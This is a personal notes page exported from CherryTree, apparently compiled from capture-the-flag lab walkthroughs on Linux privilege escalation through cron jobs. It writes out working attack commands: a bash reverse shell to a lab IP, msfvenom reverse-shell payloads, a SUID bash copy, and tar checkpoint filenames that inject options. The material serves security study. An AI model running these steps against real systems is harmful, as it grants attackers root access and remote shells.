<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Crontab</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Crontab</h1><br/><br /><br /><br /><div class="codebox"><div class="codebox">cat&nbsp;/etc/crontab</div></div><br /><br /><br /><br /><br /><br /><br />Cron jobs are used to run scripts or binaries at specific times. By  default, they run with the privilege of their owners and not the current  user. While properly configured cron jobs are not inherently  vulnerable, they can provide a privilege escalation vector under some  conditions.<br />The idea is quite simple; if there is a scheduled task  that runs with root privileges and we can change the script that will be  run, then our script will run with root privileges.<br /><br />Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.<br /><br />Each  user on the system have their crontab file and can run specific tasks  whether they are logged in or not. As you can expect, our goal will be  to find a cron job set by root and have it run our script, ideally a  shell.<br /><br />Any user can read the file keeping system-wide cron jobs under <code>/etc/crontab</code><br /><br />While  CTF machines can have cron jobs running every minute or every 5  minutes, you will more often see tasks that run daily, weekly or monthly  in penetration test engagements.<br /><a href="https://i.imgur.com/fwqPuHN.png"><img src="images/41-1.png" alt="images/41-1.png" /></a><br /><br />You can see the <code>backup.sh</code>  script was configured to run every minute. The content of the file  shows a simple script that creates a backup of the prices.xls file.<br /><a href="https://i.imgur.com/qlDj93R.png"><img src="images/41-2.png" alt="images/41-2.png" /></a><br />As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.<br /><br />The script will use the tools available on the target system to launch a reverse shell.<br />Two points to note;<br />1. The command syntax will vary depending on the available tools. (e.g. <code>nc</code> will probably not support the <code>-e</code> option you may have seen used in other cases)<br />2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.<br />The file should look like this;<br /><br /><a href="https://i.imgur.com/579yg6H.png"><img src="images/41-3.png" alt="images/41-3.png" /></a><br /><br /> We will now run a listener on our attacking machine to receive the incoming connection.<br /><br /><br /><a href="https://i.imgur.com/xwYXfY1.png"><img src="images/41-4.png" alt="images/41-4.png" /></a><br /><br /><br />Crontab  is always worth checking as it can sometimes lead to easy privilege  escalation vectors. The following scenario is not uncommon in companies  that do not have a certain cyber security maturity level:<br />1. System administrators need to run a script at regular intervals.<br />2. They create a cron job to do this<br />3. After a while, the script becomes useless, and they delete it<br /><br />4. They do not clean the relevant cron job<br />This change management issue leads to a potential exploit leveraging cron jobs. <br /><br /><br /><a href="https://i.imgur.com/SovymJL.png"><img src="images/41-5.png" alt="images/41-5.png" /></a><br /><br /><br /><br /><br />The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.<br />If  the full path of the script is not defined (as it was done for the  backup.sh script), cron will refer to the paths listed under the PATH  variable in the /etc/crontab file. In this case, we should be able to  create a script named “antivirus.sh” under our user’s home folder and it  should be run by the cron job.<br /><br /><br /><br />The file on the target system should look familiar: <br /><br /><a href="https://i.imgur.com/SHknR87.png"><img src="images/41-6.png" alt="images/41-6.png" /></a><br /><br /><br /><br />The incoming reverse shell connection has root privileges:<br /><a href="https://i.imgur.com/EBCue17.png"><img src="images/41-7.png" alt="images/41-7.png" /></a><br /><br /><br /><br />In the odd event you  find an existing script or task attached to a cron job, it is always  worth spending time to understand the function of the script and how any  tool is used within the context. For example, tar, 7z, rsync, etc., can  be exploited using their wildcard feature.<br /><br /><br /><br /><br />-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br />En regardant cat /etc/crontab, on trouve un un autoscript.sh<br /><br />on our host machine- let&#39;s create a payload for our cron exploit using msfvenom.  <br /><br /> What is the flag to specify a payload in msfvenom?<br /><br />Create a payload using:<br /><strong><h2> &quot;msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R&quot;</h2></strong><br />What directory is the &quot;autoscript.sh&quot; under?<br />Lets replace the contents of the file with our payload using: <br /><strong><h2>echo [MSFVENOM OUTPUT] &gt; autoscript.sh</h2></strong><strong><br /></strong>After copying the code into autoscript.sh  file we wait for cron to execute the file, and start our netcat listener using: <strong>&quot;nc -lvnp 8888&quot;</strong> and wait for our shell to land!<br /><br />After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! <br /><br /><br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><br /><code>cat /etc/crontab</code><br />There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.<br />Locate the full path of the overwrite.sh file:<br /><code>locate overwrite.sh</code><br />Note that the file is world-writable:<br /><code>ls -l /usr/local/bin/overwrite.sh</code><br />Replace the contents of the <small>overwrite.sh file with the following after changing the IP address to that of your Kali box.</small><br /><span style="background-color:#cec6ce;">#!/bin/bash<br />bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br />Set  up a netcat listener on your Kali box on port 4444 and wait for the  cron job to run (should not take longer than a minute). A root shell  should connect back to your netcat listener. If it doesn&#39;t recheck the  permissions of the file, is anything missing?<br /><code>nc -nvlp 4444</code><br /><br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><h2>Crontab PATH</h2><br /><br /><br /><br /><br />             <small>View the contents of the system-wide crontab:</small><br /><br /><code>cat /etc/crontab</code><br /><br />Note that the PATH variable starts with¬†<strong>/home/user</strong> which is our user&#39;s home directory.<br />Create a file called <strong>overwrite.sh</strong> in your home directory with the following contents:<br /><br /><span style="color:#000000;background-color:#cec6ce;">#!/bin/bash</span><span style="background-color:#cec6ce;"><br /><br /></span><span style="color:#000000;background-color:#cec6ce;">cp /bin/bash /tmp/rootbash<br />chmod +xs /tmp/rootbash</span><br />Make sure that the file is executable:<br /><code>chmod +x /home/user/overwrite.sh</code><br />Wait for the cron job to run (should not take longer than a minute).¬†<small>Run the /tmp/rootbash command with -p to gain a shell running with root privileges:</small><br /><br /><code>/tmp/rootbash -p</code><br /><strong>Remember  to remove the modified code, remove the /tmp/rootbash executable and  exit out of the elevated shell before continuing as you will create this  file again later in the room!</strong><br /><code>rm /tmp/rootbash<br />exit</code><br /><br />        <br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><h2>Cronjobs Wildcard</h2><br /><br /><br /><br />View the contents of the other cron job script:<br /><code>cat /usr/local/bin/compress.sh</code><br />Note that the tar command is being run with a wildcard (*) in your home directory.<br />Take a look at the GTFOBins page for <a href="https://gtfobins.github.io/gtfobins/tar/">tar</a>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.<br />Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:<br /><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code><br />Transfer the shell.elf file to <strong>/home/user/</strong> on the Debian VM (you can use <strong>scp</strong>¬†or host the file on a webserver on your Kali box and use <strong>wget</strong>). Make sure the file is executable:<br /><code>chmod +x /home/user/shell.elf</code><br />Create these two files in /home/user:<br /><code>touch /home/user/--checkpoint=1<br />touch /home/user/--checkpoint-action=exec=shell.elf</code><br /><small>When  the tar command in the cron job runs, the wildcard (*) will expand to  include these files. Since their filenames are valid tar command line  options, tar will recognize them as such and treat them as command line  options rather than filenames.</small><br />Set up a netcat listener on  your Kali box on port 4444 and wait for the cron job to run (should not  take longer than a minute). A root shell should connect back to your  netcat listener.<br /><br /><code>nc -nvlp 4444</code><br /><br /><strong><small>Remember to exit out of the root shell </small></strong><strong>and delete all the files you created to prevent the cron job from executing again:</strong><br /><code>rm /home/user/shell.elf<br />rm /home/user/--checkpoint=1<br />rm /home/user/--checkpoint-action=exec=shell.elf</code><br /></div></body></html>